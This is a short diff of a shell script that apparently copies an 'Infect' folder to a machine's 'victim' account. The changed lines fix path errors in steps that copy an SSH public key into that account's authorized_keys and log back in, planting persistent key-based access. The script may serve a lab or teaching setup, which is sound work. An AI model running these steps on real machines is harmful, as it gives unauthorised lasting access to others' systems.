@@ -22,12 +22,12 @@ scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
 
 # publickey
 ssh-keygen
-scp /.ssh/id_rsa.pub victim@"$IP_Address":/.ssh/
+scp .ssh/id_rsa.pub victim@"$IP_Address":.ssh/
 ssh victim@"$IP_Address"
-cat /.ssh/id_rsa.pub >> /.ssh/authorized_keys
-chmod 700 /.ssh/
-chmod 644 /.ssh/authorized_keys 
-ll -d /.ssh 
-ll /.ssh/authorized_keys 
+cat .ssh/id_rsa.pub >> .ssh/authorized_keys
+chmod 700 .ssh/
+chmod 644 .ssh/authorized_keys 
+ll -d .ssh 
+ll .ssh/authorized_keys 
 exit
 ssh victim@"$IP_Address"
